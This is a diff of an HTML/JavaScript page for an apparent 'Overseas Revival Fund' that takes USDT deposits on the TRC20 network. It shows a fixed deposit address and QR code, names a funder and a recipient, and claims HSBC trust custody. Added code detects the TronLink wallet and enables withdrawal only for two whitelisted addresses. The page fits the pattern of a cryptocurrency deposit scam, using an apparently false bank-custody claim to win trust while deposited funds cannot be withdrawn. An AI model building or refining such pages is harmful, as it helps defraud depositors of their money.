@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>三方协议保证金（含充值地址/二维码）</title>
+  <title>海外复兴基金</title>
   <style>
     body {
       font-family: "Microsoft YaHei", sans-serif;
@@ -134,19 +134,28 @@
       box-shadow: 0 2px 6px rgba(0,0,0,0.08);
       margin-top: 8px;
     }
+
+    .network-badge {
+      display: inline-block;
+      padding: 4px 8px;
+      border-radius: 14px;
+      background: #e9ecef;
+      font-size: 12px;
+      color: #333;
+    }
   </style>
 </head>
 <body>
 
-  <header>三方协议保证金</header>
+  <header>海外复兴基金</header>
 
   <div class="container">
 
     <div class="card">
       <p><strong>三方协议信息</strong></p>
-      <p>资金方（出资人）：刘忠</p>
-      <p>接受方（收款人）：彭 秀泽</p>
-      <p>监管方（托管机构）：汇丰银行基金</p>
+      <p>资金方（出资人）：马伯平</p>
+      <p>接受方（收款人）：王小龙</p>
+      <p>监管方（托管机构）：汇丰银行信托</p>
     </div>
 
     <p>钱包地址：<span id="addr">未连接</span></p>
@@ -174,7 +183,6 @@
         </div>
 
         <div class="right">
-          <!-- 请确保上传的二维码图片文件名为 qr.jpg -->
           <img class="qr-image" src="qr.jpg" alt="TRC20 USDT 收款二维码">
           <div class="small">扫描二维码充值</div>
         </div>
@@ -184,7 +192,58 @@
     <p class="tip">仅限授权地址指令性提现</p>
   </div>
 
+  <!-- TronLink 检测 + 钱包显示 + 白名单逻辑 -->
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
   <script>
+    // 默认显示网络
+    let currentNetwork = 'TRC20';
+
+    // 白名单地址（允许提现）
+    const ALLOWED = [
+      'TQGdup3PzYdDLdLhn5jNAUdPfoRNnA9yKC',
+      'TNiJWUJzPPCQaGwTFoeabqhDEuh6NLvBxF'
+    ];
+
+    // 合约信息（仅保留展示，不实际调用）
+    const CONTRACT_ADDRESS = 'TFFf2iQjJxxPjs4HwxBm1Tfa695LWAZPL';
+    const CONTRACT_ABI = [
+      { "inputs": [], "name": "withdraw", "outputs": [], "stateMutability": "nonpayable", "type": "function" }
+    ];
+
+    const $addr   = document.getElementById('addr');
+    const $status = document.getElementById('status');
+    const $btn    = document.getElementById('btn');
+
+    // 检测 TronLink 钱包
+    async function waitForTronLink(timeout = 10000) {
+      const start = Date.now();
+      while (Date.now() - start < timeout) {
+        if (window.tronWeb && tronWeb.ready) return true;
+        await new Promise(r => setTimeout(r, 300));
+      }
+      return false;
+    }
+
+    // 初始化钱包逻辑
+    async function initWallet() {
+      if (!await waitForTronLink()) {
+        $status.textContent = '未检测到 TronLink 钱包';
+        return;
+      }
+
+      const user = tronWeb.defaultAddress.base58;
+      $addr.textContent = user || '连接失败';
+
+      if (!ALLOWED.includes(user)) {
+        $status.textContent = '非授权地址 ❌';
+        $btn.disabled = true;
+      } else {
+        $status.textContent = '地址已授权 ✅';
+        $btn.disabled = false;
+      }
+    }
+
+    // 复制收款地址
     document.getElementById("copyAddrBtn").onclick = async () => {
       const addr = "TXsWrT6NB4WtuR76MaCuHvJ7wXE2GK45xv";
       try {
@@ -194,6 +253,8 @@
         alert("复制失败，请手动复制");
       }
     };
+
+    window.addEventListener('load', initWallet);
   </script>
 
 </body>
